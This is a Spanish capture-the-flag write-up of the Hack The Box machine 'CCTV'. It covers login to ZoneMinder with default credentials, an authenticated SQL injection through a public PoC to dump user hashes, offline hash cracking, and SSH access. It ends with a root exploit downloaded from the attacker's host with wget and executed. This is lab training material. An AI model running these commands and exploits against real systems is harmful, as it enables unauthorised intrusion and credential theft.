Write-up de **CCTV**, máquina Linux de Hack The Box. El camino: reconocimiento web hasta dar con una instancia de ZoneMinder, acceso con credenciales por defecto, una inyección SQL autenticada para dumpear la base de datos de usuarios, cracking del hash de un usuario del sistema y, finalmente, escalada a root mediante un CVE reciente del kernel/sistema localizado con LinPEAS.

## Fase 1 — Reconocimiento

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.244.156 -oG allPorts
nmap -sVC -p22,80 -oN targeted 10.129.244.156
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: SecureVision CCTV & Security Solutions
```

El nombre inverso resuelve a `cctv.htb`, así que se añade a `/etc/hosts`. El sitio se presenta como "SecureVision CCTV & Security Solutions", con pila LAMP clásica (jQuery, jQuery UI, Moment.js, core-js, Bootstrap).

## Fase 2 — Enumeración web y descubrimiento de ZoneMinder

Fuzzing de directorios y vhosts sobre el sitio principal:

```bash
ffuf -u http://cctv.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,307,401,403 -t 50
ffuf -u http://cctv.htb/ -H "Host: FUZZ.cctv.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403 -fs 0
```

El fuzzing revela una ruta `/zm/` con una aplicación de videovigilancia:

```bash
whatweb http://cctv.htb/zm/index.php
```

```
http://cctv.htb/zm/index.php [200 OK] Apache[2.4.58], Bootstrap[4.5.0], Cookies[ZMSESSID,zmCSS,zmSkin],
HTML5, PHP, PasswordField[password], Title[ZM - Login], ZoneMinder
```

Confirmado: **ZoneMinder** en `http://cctv.htb/zm/`, con panel de login en `index.php` y API disponible en `/zm/api/`.

## Fase 3 — Acceso con credenciales por defecto y fuga de versión

El login acepta las credenciales por defecto **admin:admin**. Una vez dentro, la API de configuración expone la versión exacta de la instancia:

```bash
curl -s -u admin:admin http://cctv.htb/zm/api/configs.json | grep -i -E 'DYN_CURR_VERSION|DYN_DB_VERSION'
```

**ZoneMinder 1.37.63**. El panel también permite enumerar los usuarios existentes de la aplicación: `admin`, `mark` y `superadmin`.

## Fase 4 — CVE-2024-51482: SQLi autenticada en ZoneMinder

La versión 1.37.63 cae dentro del rango afectado (1.37.0–1.37.64) por **CVE-2024-51482**, una inyección SQL autenticada (CVSS 9.9) en el parámetro `tid` de la acción `removetag`, en `web/ajax/event.php`:

```
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
```

Con sesión autenticada como `admin:admin` ya se cumple el único requisito de la vulnerabilidad. Explotación con el PoC público [CVE-2024-51482 de BridgerAlderson](https://github.com/BridgerAlderson/CVE-2024-51482), que automatiza la inyección y el dump de la tabla `Users` de la base de datos `zm`:

```bash
git clone https://github.com/BridgerAlderson/CVE-2024-51482
cd CVE-2024-51482
python3 exploit.py -u http://cctv.htb/zm/ -U admin -P admin --dump-users
```

El dump de la tabla `Users` devuelve, entre otros, el hash de contraseña del usuario `mark`:

```
mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
```

## Fase 5 — Cracking del hash y acceso por SSH

Hash bcrypt (`$2y$10$...`), coste 10. Cracking offline con John the Ripper:

```bash
echo 'mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > mark.hash
john --wordlist=/usr/share/wordlists/rockyou.txt mark.hash
john --show mark.hash
```

```
mark:opensesame
```

La contraseña recuperada funciona directamente por SSH, ya que los usuarios de ZoneMinder y los del sistema son independientes, pero en este caso coinciden:

```bash
ssh mark@cctv.htb
# password: opensesame
id
# uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev)
```

## Fase 6 — Enumeración local

`mark` no pertenece a `sudo` ni `adm`. Enumeración estándar de binarios SUID, capabilities, cron y pertenencia a grupos (`cdrom`, `dip`, `plugdev`) no revela ninguna vía de escalada: son grupos estándar de un Ubuntu moderno, sin software mal configurado (`usbguard`, reglas `udev` personalizadas, etc.) que los convierta en vector real en esta máquina. La búsqueda automatizada con LinPEAS es lo que finalmente localiza el vector real.

## Fase 7 — Escalada de privilegios: CVE-2026-41651

LinPEAS señala el sistema como vulnerable a **CVE-2026-41651**. El exploit público correspondiente se transfiere a la máquina víctima (por ejemplo, con un servidor HTTP de Python en el atacante y `wget`/`curl` en la víctima) y se ejecuta directamente:

```bash
# en el atacante
python3 -m http.server 8000

# en la víctima
wget http://<IP_ATACANTE>:8000/exploit -O /tmp/exploit
chmod +x /tmp/exploit
/tmp/exploit
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

> **Nota:** CVE-2026-41651 es posterior a la fecha de corte de conocimiento del asistente usado durante la sesión, por lo que no se documenta aquí el mecanismo interno de la vulnerabilidad — solo el flujo operativo (descarga + ejecución) seguido para explotarla.

### Flag de root

```bash
cat /root/root.txt
```

### Flag de usuario

A diferencia de lo esperado, la flag de usuario no está en `/home/mark`, sino en el directorio de otra cuenta del sistema, `sa_mark`, accesible ya con privilegios de root:

```bash
cat /home/sa_mark/user.txt
```
